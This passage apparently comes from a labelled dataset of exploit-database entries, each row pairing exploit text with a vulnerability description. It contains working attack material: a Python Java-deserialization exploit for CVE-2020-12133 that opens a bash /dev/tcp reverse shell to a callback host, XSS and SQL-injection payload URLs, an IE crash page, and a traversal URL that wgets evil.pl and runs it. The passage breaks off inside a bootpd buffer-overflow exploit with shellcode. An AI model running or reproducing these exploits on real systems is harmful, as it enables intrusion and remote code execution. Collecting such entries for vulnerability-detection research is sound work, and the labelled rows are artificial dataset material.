Tomcat/7.0.68 #            Apache Tomcat/7.0.52 #            Apache MyFaces/2.2.1 #            Apache MyFaces/2.1.17 #            Apache MyFaces/2.0.10 #            GNU/Linux 4.4.0-173 #            GNU/Linux 4.4.0-137 #            GNU/Linux 4.4.0-101 #            GNU/Linux 4.4.0-83 #            GNU/Linux 3.15.0 #            GNU/Linux 3.13.0-32 #            PrimeFaces/4.0.RC1 #            Apache-Coyote/1.1 #            ACC Library 3.1 #            Ubuntu 16.04.2 #            Ubuntu 14.04.2 #            Java/1.8.0_242 #            Java/1.8.0_181 #            Java/1.8.0_131 #            Java/1.7.0_79 #            MySQL 5.7.29 #            MySQL 5.7.18 # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic # Macedonian Information Security Research and Development Laboratory # Zero Science Lab - https://www.zeroscience.mk - @zeroscience # # # Advisory ID: ZSL-2020-5565 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5565.php # # CVE ID: CVE-2020-12133 # CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-12133 # # # 24.02.2020 #  import os############# import sys############ import gzip#######o### import zlib########### import socket######### import base64######### import urllib######### import requests####### import telnetlib###### import threading###### import subprocess#####  from io import BytesIO from time import sleep from flash import blic  class Optics:      def __init__(self):         self.callback = None#         self.headers = None##         self.payload = None##         self.target = None###         self.lport = None####         self.path = None#####         self.cmd = None######      def allears(self):         telnetus = telnetlib.Telnet()         print(""[*] Starting handler on port {}"".format(self.lport))         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         s.bind((""0.0.0.0"", self.lport))         while True:             try:                 s.settimeout(8)                 s.listen(1)                 conn, addr = s.accept()                 print(""[*] Connection from {}:{}"".format(addr[0], addr[1]))                 telnetus.sock = conn             except socket.timeout as p:                 print(""[!] Probably not vulnerable... ({poraka})"".format(poraka=p))                 print(""[+] Check your port mappings."")                 s.close()                 exit(0)             break          print(""[*] You got shell!"")          #         # UnicodeDecodeError dirty fix:         # /usr/lib/python3.6/telnetlib.py         # Change from 'ascii' to 'utf-8' (Lines: 553 and 556)         #          telnetus.interact()         conn.close()      def thricer(self):         print(""[*] Starting callback listener child thread"")         konac = threading.Thread(name=""ZSL"", target=self.allears)         konac.start()         sleep(1)         self.gadget()      def gadget(self):         self.cmd =  ""/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/""         self.cmd += self.callback         self.cmd += ""/""         self.cmd += str(self.lport)         self.cmd += ""<&1""          payload =  b""\xAC\xED\x00\x05\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x75\x74\x69\x6C""         payload += b""\x2E\x48\x61\x73\x68\x53\x65\x74\xBA\x44\x85\x95\x96\xB8\xB7\x34\x03""         payload += b""\x00\x00\x78\x70\x77\x0C\x00\x00\x00\x02\x3F\x40\x00\x00\x00\x00\x00""         payload += b""\x01\x73\x72\x00\x34\x6F\x72\x67\x2E\x61\x70\x61\x63\x68\x65\x2E\x63""         payload += b""\x6F\x6D\x6D\x6F\x6E\x73\x2E\x63\x6F\x6C\x6C\x65\x63\x74\x69\x6F\x6E""         payload += b""\x73\x2E\x6B\x65\x79\x76\x61\x6C\x75\x65\x2E\x54\x69\x65\x64\x4D\x61""         payload += b""\x70\x45\x6E\x74\x72\x79\x8A\xAD\xD2\x9B\x39\xC1\x1F\xDB\x02\x00\x02""         payload += b""\x4C\x00\x03\x6B\x65\x79\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61""         payload += b""\x6E\x67\x2F\x4F\x62\x6A\x65\x63\x74\x3B\x4C\x00\x03\x6D\x61\x70\x74""         payload += b""\x00\x0F\x4C\x6A\x61\x76\x61\x2F\x75\x74\x69\x6C\x2F\x4D\x61\x70\x3B""         payload += b""\x78\x70\x74\x00\x26\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68""         payload += b""\x75\x62\x2E\x63\x6F\x6D\x2F\x6A\x6F\x61\x6F\x6D\x61\x74\x6F\x73\x66""         payload += b""\x2F\x6A\x65\x78\x62\x6F\x73\x73\x20\x73\x72\x00\x2A\x6F\x72\x67\x2E""         payload += b""\x61\x70\x61\x63\x68\x65\x2E\x63\x6F\x6D\x6D\x6F\x6E\x73\x2E\x63\x6F""         payload += b""\x6C\x6C\x65\x63\x74\x69\x6F\x6E\x73\x2E\x6D\x61\x70\x2E\x4C\x61\x7A""         payload += b""\x79\x4D\x61\x70\x6E\xE5\x94\x82\x9E\x79\x10\x94\x03\x00\x01\x4C\x00""         payload += b""\x07\x66\x61\x63\x74\x6F\x72\x79\x74\x00\x2C\x4C\x6F\x72\x67\x2F\x61""         payload += b""\x70\x61\x63\x68\x65\x2F\x63\x6F\x6D\x6D\x6F\x6E\x73\x2F\x63\x6F\x6C""         payload += b""\x6C\x65\x63\x74\x69\x6F\x6E\x73\x2F\x54\x72\x61\x6E\x73\x66\x6F\x72""         payload += b""\x6D\x65\x72\x3B\x78\x70\x73\x72\x00\x3A\x6F\x72\x67\x2E\x61\x70\x61""         payload += b""\x63\x68\x65\x2E\x63\x6F\x6D\x6D\x6F\x6E\x73\x2E\x63\x6F\x6C\x6C\x65""         payload += b""\x63\x74\x69\x6F\x6E\x73\x2E\x66\x75\x6E\x63\x74\x6F\x72\x73\x2E\x43""         payload += b""\x68\x61\x69\x6E\x65\x64\x54\x72\x61\x6E\x73\x66\x6F\x72\x6D\x65\x72""         payload += b""\x30\xC7\x97\xEC\x28\x7A\x97\x04\x02\x00\x01\x5B\x00\x0D\x69\x54\x72""         payload += b""\x61\x6E\x73\x66\x6F\x72\x6D\x65\x72\x73\x74\x00\x2D\x5B\x4C\x6F\x72""         payload += b""\x67\x2F\x61\x70\x61\x63\x68\x65\x2F\x63\x6F\x6D\x6D\x6F\x6E\x73\x2F""         payload += b""\x63\x6F\x6C\x6C\x65\x63\x74\x69\x6F\x6E\x73\x2F\x54\x72\x61\x6E\x73""         payload += b""\x66\x6F\x72\x6D\x65\x72\x3B\x78\x70\x75\x72\x00\x2D\x5B\x4C\x6F\x72""         payload += b""\x67\x2E\x61\x70\x61\x63\x68\x65\x2E\x63\x6F\x6D\x6D\x6F\x6E\x73\x2E""         payload += b""\x63\x6F\x6C\x6C\x65\x63\x74\x69\x6F\x6E\x73\x2E\x54\x72\x61\x6E\x73""         payload += b""\x66\x6F\x72\x6D\x65\x72\x3B\xBD\x56\x2A\xF1\xD8\x34\x18\x99\x02\x00""         payload += b""\x00\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3B\x6F\x72\x67\x2E\x61\x70""         payload += b""\x61\x63\x68\x65\x2E\x63\x6F\x6D\x6D\x6F\x6E\x73\x2E\x63\x6F\x6C\x6C""         payload += b""\x65\x63\x74\x69\x6F\x6E\x73\x2E\x66\x75\x6E\x63\x74\x6F\x72\x73\x2E""         payload += b""\x43\x6F\x6E\x73\x74\x61\x6E\x74\x54\x72\x61\x6E\x73\x66\x6F\x72\x6D""         payload += b""\x65\x72\x58\x76\x90\x11\x41\x02\xB1\x94\x02\x00\x01\x4C\x00\x09\x69""         payload += b""\x43\x6F\x6E\x73\x74\x61\x6E\x74\x71\x00\x7E\x00\x03\x78\x70\x76\x72""         payload += b""\x00\x11\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x52\x75\x6E\x74\x69""         payload += b""\x6D\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72""         payload += b""\x00\x3A\x6F\x72\x67\x2E\x61\x70\x61\x63\x68\x65\x2E\x63\x6F\x6D\x6D""         payload += b""\x6F\x6E\x73\x2E\x63\x6F\x6C\x6C\x65\x63\x74\x69\x6F\x6E\x73\x2E\x66""         payload += b""\x75\x6E\x63\x74\x6F\x72\x73\x2E\x49\x6E\x76\x6F\x6B\x65\x72\x54\x72""         payload += b""\x61\x6E\x73\x66\x6F\x72\x6D\x65\x72\x87\xE8\xFF\x6B\x7B\x7C\xCE\x38""         payload += b""\x02\x00\x03\x5B\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5B\x4C\x6A""         payload += b""\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x4F\x62\x6A\x65\x63\x74\x3B\x4C""         payload += b""\x00\x0B\x69\x4D\x65\x74\x68\x6F\x64\x4E\x61\x6D\x65\x74\x00\x12\x4C""         payload += b""\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B""         payload += b""\x5B\x00\x0B\x69\x50\x61\x72\x61\x6D\x54\x79\x70\x65\x73\x74\x00\x12""         payload += b""\x5B\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x43\x6C\x61\x73\x73""         payload += b""\x3B\x78\x70\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61\x6E""         payload += b""\x67\x2E\x4F\x62\x6A\x65\x63\x74\x3B\x90\xCE\x58\x9F\x10\x73\x29\x6C""         payload += b""\x02\x00\x00\x78\x70\x00\x00\x00\x02\x74\x00\x0A\x67\x65\x74\x52\x75""         payload += b""\x6E\x74\x69\x6D\x65\x75\x72\x00\x12\x5B\x4C\x6A\x61\x76\x61\x2E\x6C""         payload += b""\x61\x6E\x67\x2E\x43\x6C\x61\x73\x73\x3B\xAB\x16\xD7\xAE\xCB\xCD\x5A""         payload += b""\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4D""         payload += b""\x65\x74\x68\x6F\x64\x75\x71\x00\x7E\x00\x1B\x00\x00\x00\x02\x76\x72""         payload += b""\x00\x10\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E""         payload += b""\x67\xA0\xF0\xA4\x38\x7A\x3B\xB3\x42\x02\x00\x00\x78\x70\x76\x71\x00""         payload += b""\x7E\x00\x1B\x73\x71\x00\x7E\x00\x13\x75\x71\x00\x7E\x00\x18\x00\x00""         payload += b""\x00\x02\x70\x75\x71\x00\x7E\x00\x18\x00\x00\x00\x00\x74\x00\x06\x69""         payload += b""\x6E\x76\x6F\x6B\x65\x75\x71\x00\x7E\x00\x1B\x00\x00\x00\x02\x76\x72""         payload += b""\x00\x10\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4F\x62\x6A\x65\x63""         payload += b""\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x76\x71\x00""         payload += b""\x7E\x00\x18\x73\x71\x00\x7E\x00\x13\x75\x72\x00\x13\x5B\x4C\x6A\x61""         payload += b""\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E\x67\x3B\xAD\xD2""         payload += b""\x56\xE7\xE9\x1D\x7B\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00""         payload += (bytes(chr(len(self.cmd)), ""utf-8""))##################################""         payload += (bytes(self.cmd, ""utf-8""))############################################""         payload += b""\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7E\x00\x1B\x00\x00\x00\x01""         payload += b""\x71\x00\x7E\x00\x20\x73\x71\x00\x7E\x00\x0F\x73\x72\x00\x11\x6A\x61""         payload += b""\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x49\x6E\x74\x65\x67\x65\x72\x12\xE2""         payload += b""\xA0\xA4\xF7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6C\x75\x65""         payload += b""\x78\x72\x00\x10\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4E\x75\x6D""         payload += b""\x62\x65\x72\x86\xAC\x95\x1D\x0B\x94\xE0\x8B\x02\x00\x00\x78\x70\x00""         payload += b""\x00\x00\x01\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x75\x74\x69\x6C\x2E""         payload += b""\x48\x61\x73\x68\x4D\x61\x70\x05\x07\xDA\xC1\xC3\x16\x60\xD1\x03\x00""         payload += b""\x02\x46\x00\x0A\x6C\x6F\x61\x64\x46\x61\x63\x74\x6F\x72\x49\x00\x09""         payload += b""\x74\x68\x72\x65\x73\x68\x6F\x6C\x64\x78\x70\x3F\x40\x00\x00\x00\x00""         payload += b""\x00\x00\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x78""#######""          jbits = BytesIO()         with gzip.GzipFile(fileobj=jbits, mode=""wb"") as f:             f.write(payload)         serialize = base64.b64encode(jbits.getvalue())         print(""[*] Sending serialized object"")          self.headers = {             ""Accept""       : ""text/html,application/xhtml+xml,application/xml;q=1.pwn"",             ""Content-Type"" : ""application/x-www-form-urlencoded"",             ""User-Agent""   : ""ISP-Eye/2.51"",             ""Connection""   : ""keep-alive""}          self.paramz={""javax.faces.ViewState"" : serialize}         #sleep(1)         r = requests.post(self.target + self.path, headers=self.headers, data=self.paramz)              def par(self):         if len(sys.argv) != 4:             self.usage()         else:                 self.target = sys.argv[1]             self.callback = sys.argv[2]             self.lport = int(sys.argv[3])             if not ""http"" in self.target:                 self.target = ""http://{}"".format(self.target)      def check(self):         print(""[*] Setting up valid URL path"")         try:             r = requests.get(self.target)             app = r.text             if not ""FURUKAWA"" in app and not ""APROS"" in app:                 print(""[!] App not detected."")                 exit(0)             if ""FURUKAWA"" in app:                 self.path = ""/FURUKAWA/""             elif ""APROS"" in app:                 self.path = ""/APROS/""             else:                 exit(-1337)         except Exception as p:             print(""[!] Somethingz wrong: \n--\n{poraka}"".format(poraka=p))             exit(0)      def framed(self):         naslov = """"""     o===--------------------------------------===o     |                                            |     |        Furukawa Electric / Tecnored        |     |  APROS Evolution | FURUKAWA | ConsciusMAP  |     |          Fiber-To-The-Home (FTTH)          |     |                                            |     | Java Deserialization Remote Code Execution |     |                ZSL-2020-5565               |     |                                            |     o===--------------------------------------===o                           ||                           ||                     (\__/)||                     (•ㅅ•)||                     / 　 づ|         """"""         print(naslov)      def usage(self):         self.framed()         print(""Usage: ./furukawa.py <RHOST[:RPORT]> <LHOST> <LPORT>"")         print(""Example: ./furukawa.py 172.16.0.1:8080 172.16.0.200 4444\n"")         exit(0)      def main(self):         self.par()########()         self.check()######()         self.thricer()####()  if __name__ == '__main__':     Optics().main()",an unsafe deserialization of Java objects (ViewState) triggered via the 'javax.faces.ViewState' HTTP POST parameter,1
31888,SchoolCenter 7.5 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29591/info  SchoolCenter is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/education/components/docmgr/default.php?sectiondetailid=2179&fileitem=477&catfilter=XSS http://www.example.com/education/components/docmgr/default.php?sectiondetailid=#XSS http://www.example.com/education/components/scrapbook/default.php?sectiondetailid=#XSS http://www.example.com/education/district/district.php?sectiondetailid=#XSS http://www.example.com/education/admin/XSS http://www.example.com/education/components/XSS http://www.example.com/education/components/whatsnew/default.php?sectiondetailid=#XSS,fails to sufficiently sanitize user-supplied data,1
27146,sPaiz-Nuke - 'modules.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/16412/info  sPaiz-Nuke is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/sPaiz-Nuke/modules.php?name=Articles&file=search&query=[XSS]&type=articles&type=comments,a failure in the application to properly sanitize user-supplied input,1
30967,LiveCart 1.0.1 - 'email' Cross-Site Scripting source: https://www.securityfocus.com/bid/27087/info     LiveCart is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.     LiveCart 1.0.1 is vulnerable to these issues; other versions may also be affected.   http://www.example.com/user/remindComplete?email=XSS,fails to properly sanitize user-supplied input,1
25858,"DUware DUportal 3.4.3 Pro - Multiple SQL Injections source: https://www.securityfocus.com/bid/14029/info  DUportal Pro is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Some of these issues may have previously been discussed in BID 13285 and BID 13288.   http://www.example.com/DUportalPro34/Articles/default.asp?iChannel=2[SQL Inject]&nChannel=Articles http://www.example.com/DUportalPro34/Articles/detail.asp?iData=4[SQL Inject]&iCat=292&iChannel=2&nChannel=Articles http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/topics/cat.asp?iCat=4[SQL Inject]&iChannel=16&nChannel=Topics http://www.example.com/DUportalPro34/Polls/default.asp?iChannel=15[SQL Inject]&nChannel=Polls http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/admin/members_listing_approval.asp?offset=[SQL Inject] http://www.example.com/DUportalPro34/admin/channels_edit.asp?iChannel=7[SQL inject]&nChannel=[Name Module]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
27388,"MyBloggie 2.1.2/2.1.3 - 'delcat.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17048/info          MyBloggie is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.           An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/mybloggie213beta/admin.php?mode=delcat&cat_id=""><script>alert('xss_string')</script>",a failure in the application to properly sanitize user-supplied input,1
23273,"Microsoft Internet Explorer 6 - Scrollbar-Base-Color Partial Denial of Service source: https://www.securityfocus.com/bid/8874/info  It has been reported that Microsoft Internet Explorer is prone to a vulnerability that may allow an attacker to cause a denial of service condition in the software. The problem occurs due to improper handling of scrollbar-base-color attribute of the div object.  Successful exploitation of this issue may allow an attacker to create a webpage containing malicious script code that would cause a user's browser to crash upon visiting the site.  Microsoft Internet Explorer 6.0 has been reported to be vulnerable to this issue, however other versions may be affected as well.  <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN""> <html> <head> <title>CRASH-IE</title> <style type=""text/css""> html, body { overflow-y: hidden; scrollbar-base-color: '#330066'; }  .crash { position:absolute; left:200px; top:200px; width:200px; }  </style> <script type=""text/javascript""> function galgenfrist() { window.setTimeout('crashIE();',1000); }  function crashIE() { var moveNode = document.getElementById(""move""); if(moveNode) { moveNode.style.top = ""100px""; moveNode.style.left = ""200px""; } } </script> </head> <body onload=""galgenfrist();""> <h1>CRASH-IE</h1> <div id=""move"" class=""crash""> <table> <tbody> <tr> <td> <textarea>&lt;/textarea&gt; </td> </tr> </tbody> </table> </div> </body> </html>",improper handling of scrollbar-base-color attribute of the div object,1
25669,"pserv 3.2 - Directory Traversal source: https://www.securityfocus.com/bid/13642/info  pServ is prone to a directory traversal vulnerability. This occurs because the application does not implement a proper method for filtering directory traversal sequences from URIs. Since this can be done from the cgi-bin directory, it is possible to execute commands to which the Web server has permission.  This issue was reported to affect pServ version 3.2; earlier versions are like vulnerable.   The following url downloads a script (or executable) to the server: http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/wget?-q+http://evil-site/evil.pl/+-O+/tmp/evil.pl  This is how the script can be executed afterwards: http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/perl?/tmp/evil.pl",the application does not implement a proper method for filtering directory traversal sequences from URIs,1
36833,Endian Firewall 2.4 - 'dansguardian.cgi?addrule' Cross-Site Scripting source: https://www.securityfocus.com/bid/52076/info    Endian Firewall is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible.    https://www.example.com/cgi-bin/dansguardian.cgi#addrule[XSS],fails to sufficiently sanitize user-supplied data,1
32655,"Multiple Ad Server Solutions Products - 'logon_processing.jsp' SQL Injection source: https://www.securityfocus.com/bid/32782/info  Multiple Ad Server Solutions products are prone to SQL-injection vulnerabilities because they fail to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  The following Ad Server Solutions products are vulnerable:  Ad Management Software Affiliate Software   The following example data is available:  username: r0' or ' 1=1-- password: r0' or ' 1=1--",fail to sufficiently sanitize user-supplied data before using it in an SQL query,1
35723,"TCExam 11.1.29 - 'tce_xml_user_results.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/47762/info  TCExam is prone to multiple SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  TCExam 11.1.029 is vulnerable; other versions may also be affected.   http://www.example.com/tcexam/admin/code/tce_xml_user_results.php?lang=&user_id=1&startdate=[SQL]&enddate=[SQL]&order_field=[SQL]",fails to properly sanitize user-supplied input before using it in an SQL query,1
26849,ECTOOLS Onlineshop 1.0 - Cross-Site Scripting source: https://www.securityfocus.com/bid/15891/info  ECTOOLS Onlineshop is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/cart.cgi?action=link&product=%22%3E%3Cscri pt%3Ealert('r0t')%3C/script%3E  http://www.example.com/cart.cgi?action=search&category=%22%3E%3Cs cript%3Ealert('r0t')%3C/script%3E  http://www.example.com/cart.cgi?action=link&product=33&uid=%22%3E %3Cscript%3Ealert('r0t')%3C/script%3E,a failure in the application to properly sanitize user-supplied input,1
22819,"Tutos 1.1 - File_New Arbitrary File Upload source: https://www.securityfocus.com/bid/8012/info  It has been reported that Tutos does not properly handle input to the file_new script. Because of this, an attacker may be able to upload arbitrary files to a vulnerable site.  We can upload via http://www.example.com/tutos/file/file_new.php?link_id=1065  The path is http://www.example.com/tutos/repository/[project number]/[file number]/FILE",Tutos does not properly handle input to the file_new script,1
29104,"vSpin Classified System 2004 - 'search.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/21190/info   vSpin Classified System is prone to multiple input-validation vulnerabilities, including SQL-injection and cross-site scripting issues, because the application fails to sufficiently sanitize user-supplied data.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.   http://www.example.com/search.asp?in=y&keyword='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort=DESC&cat=0&menuSelect='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort=DESC&cat=0&menuSelect=1&type=1&city=1&minprice=1&maxprice=1&state='[sql]",the application fails to sufficiently sanitize user-supplied data,1
30957,"PHCDownload 1.1 - 'search.php?string' SQL Injection source: https://www.securityfocus.com/bid/27066/info  PHCDownload is prone to an SQL-injection and cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. Attackers may also exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  PHCDownload 1.1.0 is vulnerable; other versions may also be affected.   http://www.example.com/[phcdownload/search.php?string='",fails to properly sanitize user-supplied input,1
19256,"Stanford University bootpd 2.4.3 / Debian 2.0 - netstd // source: https://www.securityfocus.com/bid/324/info  The netstd package, included with the Debian GNU/Linux distribution is vulnerable to two buffer overflow attacks. The first is in the bootp server, the second in the FTP client.  Bootpd version 2.4.3(and earlier) is prone to a number of buffer overflow conditions that may allow a remote attacker to fully compromise a host running a vulnerable version. This is due to improper bounds checking in the handling of the boot file/location specified in a bootp request packet, and in the error logging facility. This vulnerability is specific to the bootp daemon and any Unix distributions that ship with the affected version should be considered vulnerable.  A buffer overflow condition also exists in the netstd FTP client, which may be exploited by a local attacker to potentially elevate privileges.  /*  * Bootpd Exploit against debian linux 1.3 and 2.0 and possibly other  *  * (C) 1998  Willem Pinckaers W.H.J.Pinckaers@cpedu.rug.nl  *  */  #include <netinet/in.h> #include <sys/socket.h> #include <sys/types.h> #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include ""bootp.h""  char shellcode[] = ""\x31"" ""\xc9"" ""\x89"" ""\xc8"" ""\x04"" ""\x66"" ""\x41"" ""\x89"" ""\xca"" ""\x89"" ""\xcb"" ""\xeb"" ""\x7f"" ""\x5f"" ""\x89"" ""\x4f"" ""\x08"" ""\x41"" ""\x89"" ""\x4f"" ""\x04"" ""\x80"" ""\xc1"" ""\x04"" ""\x89"" ""\x4f"" ""\x0c"" ""\x8d"" ""\x4f"" ""\x04"" ""\xcd"" ""\x80"" ""\x89"" ""\x07"" ""\x31"" ""\xc9"" ""\x80"" ""\xc1"" ""\x02"" ""\x66"" ""\x89"" ""\x4f"" ""\x0c"" ""\x66"" ""\x89"" ""\x4f"" ""\x0e"" ""\x80"" ""\xc1"" ""\x0e"" ""\x66"" ""\x89"" ""\x4f"" ""\x08"" ""\x66"" ""\xb9"" ""\x30"" ""\x39"" ""\x66"" ""\x89"" ""\x4f"" ""\x0e"" ""\x8d"" ""\x47"" ""\x0c"" ""\x89"" ""\x47"" ""\x04"" ""\x31"" ""\xc9"" ""\xb1"" ""\x03"" ""\x89"" ""\xca"" ""\x89"" ""\xcb"" ""\x89"" ""\xf9"" ""\x31"" ""\xc0"" ""\x04"" ""\x66"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x89"" ""\xc1"" ""\x04"" ""\x3f"" ""\x89"" ""\xc2"" ""\x8b"" ""\x1f"" ""\xcd"" ""\x80"" ""\x89"" ""\xd0"" ""\x41"" ""\xcd"" ""\x80"" ""\x89"" ""\xd0"" ""\x41"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x89"" ""\x47"" ""\x10"" ""\x88"" ""\x47"" ""\x1b"" ""\x8d"" ""\x47"" ""\x14"" ""\x89"" ""\x47"" ""\x0c"" ""\x31"" ""\xc0"" ""\x04"" ""\x0b"" ""\x8d"" ""\x5f"" ""\x14"" ""\x8d"" ""\x4f"" ""\x0c"" ""\x8d"" ""\x57"" ""\x10"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x40"" ""\xcd"" ""\x80"" ""\xe8"" ""\x7c"" ""\xff"" ""\xff"" ""\xff"" ""\x2e"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x39"" ""\x30"" ""\xc0"" ""\xa8"" ""\x01"" ""\x01"" ""\x2f"" ""\x62"" ""\x69"" ""\x6e"" ""\x2f"" ""\x73"" ""\x68"" ""\x00"";  #define SERVER_PORT     67  char client_addr[16] = ""127.000.000.001""; char host_addr[16] = ""127.000.000.001""; int realpath_adjust = 0; int exploit_length = 1200;   struct sockaddr_in server_addr; void sendpacket(int, struct bootp *); void build_packet(struct bootp *, int, char**); void get_args(int, char**); void usage(void);  int main(int argc, char *argv[]) {     struct bootp* bp;     int s;      get_args(argc, argv);      server_addr.sin_family = AF_INET;     server_addr.sin_port = htons(SERVER_PORT);     server_addr.sin_addr.s_addr = inet_addr(host_addr);       if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {         fprintf(stderr, ""cannot create socket\n"");         exit(1);     }     if ((bp = (struct bootp*) malloc(MAX_MSG_SIZE + 1000)) == NULL) {         (void) fprintf(stderr, ""Cannot malloc.\n"");         exit(1);     };     (void) memset(bp, 0, MAX_MSG_SIZE + 1000); /* ai exploit isn't secure */     build_packet(bp, argc, argv);      sendpacket(s, bp); }  void sendpacket(int s, struct bootp *bp) {     if (sendto(s, (const void *) bp, MAX_MSG_SIZE, 0,       (const struct sockaddr *) &server_addr,       sizeof(struct sockaddr_in)) == -1) {         fprintf(stderr, ""sendpacket: sendto returned -1 ;(\n"");         exit(1);     } }  void build_packet(struct bootp *bp, int argc, char *argv[]) {     unsigned long start_realpath = 0xbffff684 + realpath_adjust;     unsigned long addr_ret_addr = start_realpath + 8 + 0x488;     unsigned long temp_addr, temp_addr2 = 0;     int length_tftpdir = 1;    // no ftpdir just a slash at the start..     int num_nops = 600;     char *p;     unsigned long *q;     int i;      bp->bp_op = BOOTREQUEST;     bp->bp_xid = 58524;     bp->bp_htype = HTYPE_ETHERNET;     bp->bp_hlen = 6;     bp->bp_ciaddr.s_addr = inet_addr(client_addr);      printf(""Using: client: %s\n"", client_addr);     printf(""Using: server: %s\n"", host_addr);     printf(""Addr of realpath: %x\n"", start_realpath);     p = bp->bp_file; /* Putting in nops */     for (i = 0; i < num_nops; i++)         *p++ = 0x90;     printf(""Added: %d nops\n"", num_nops);  /* Putting in shellcode */     for(i = 0; i < strlen(shellcode); i++)         *p++ = shellcode[i];     printf(""%d bytes of shellcode added.\n"", strlen(shellcode));  /* Aligning to make sure the ret_addr is placed correctly */     temp_addr = p - bp->bp_file + length_tftpdir + start_realpath;     for(i = 0; i < (addr_ret_addr - temp_addr) % 4; i++)         *p++ = 'a';     printf(""%d bytes of alignment 